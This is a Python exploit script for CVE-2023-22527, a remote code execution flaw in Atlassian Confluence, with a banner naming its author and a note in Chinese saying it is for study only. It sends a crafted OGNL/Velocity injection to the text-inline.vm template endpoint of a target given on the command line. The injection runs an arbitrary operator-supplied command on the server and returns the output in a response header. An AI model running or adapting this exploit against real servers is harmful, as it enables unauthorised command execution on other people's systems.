import sys
from urllib.parse import urljoin
import requests

def begin():
    print('''

  ______     _______     ____   ___ ____  _____      ____  ____  ____ ____   _____ 
 / ___\ \   / / ____|   |___ \ / _ \___ \|___ /     |___ \|___ \| ___|___ \ |___  |
| |    \ \ / /|  _| _____ __) | | | |__) | |_ \ _____ __) | __) |___ \ __) |   / / 
| |___  \ V / | |__|_____/ __/| |_| / __/ ___) |_____/ __/ / __/ ___) / __/   / /  
 \____|  \_/  |_____|   |_____|\___/_____|____/     |_____|_____|____/_____| /_/   
                                                                            
                            @Auth: T0ngMystic
                            @tips: Exp仅供学习使用，请勿用于其他用途    
                            @Blog: https://t0ngmystic.com             

        ''')

header = {
    "User-Agent": "https://t0ngmystic.com?agent=VDBuZ215c3RpYw==",
    'Content-Type': 'application/x-www-form-urlencoded'
}
def exp(domain,commond):
    url = urljoin(domain, "/template/aui/text-inline.vm")
    data = "label=\\u0027%2b#request.get(\\u0027.KEY_velocity.struts2.context\\u0027).internalGet(\\u0027ognl\\u0027).findValue(#parameters.poc,{})%2b\\u0027&poc=@org.apache. struts2.ServletActionContext@getResponse().setHeader('CMDR',(new freemarker.template.utility.Execute()).exec({\""+commond+"\"}))"
    res = requests.post(url, data=data, headers=header)
    if res.status_code == 200:
        if 'CMDR' in res.headers:
            cmdr_value = res.headers['CMDR']
            print(f"{cmdr_value}")
        else:
            print("未成功")

if __name__ == '__main__':
    begin()
    if len(sys.argv) == 3:
        domain = sys.argv[1]
        commond = sys.argv[2]
        exp(domain,commond)
    else:
        print("""Help:
                 python .\CVE-2023-22527-EXP.py <Confluence_domain> <Commond>
                 """)
        sys.exit()
